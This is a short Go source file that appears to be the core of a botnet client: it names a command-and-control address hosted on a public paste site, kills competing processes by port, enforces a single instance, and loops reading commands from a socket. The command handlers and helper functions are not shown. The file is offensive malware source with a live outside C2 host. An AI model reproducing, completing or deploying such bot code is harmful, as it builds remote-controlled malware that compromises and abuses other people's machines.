package main

import (
	"bufio"
	"fmt"
	"strings"
)

var (
	cnc_addr             = "https://rentry.co/ibv7p/raw"
	debug_mode           = true
	single_instance_port = 13370
)

func debug(content string) {
	if debug_mode {
		fmt.Printf("[DEBUG] %s\n", content)
	}
}

func main() {
	go kill_all_by_port()
	bind_instance_port()

	socket := init_socket()

	for {
		data, err := bufio.NewReader(socket).ReadString('\n')

		if err != nil {
			debug(fmt.Sprintf("Error when read buffer: %s", err))
			break
		}

		data = strings.Split(data, "\n")[0]
		args := strings.Split(data, " ")

		debug(fmt.Sprintf("Recieved command: %s | args: %d", data, len(args)))
	}
}
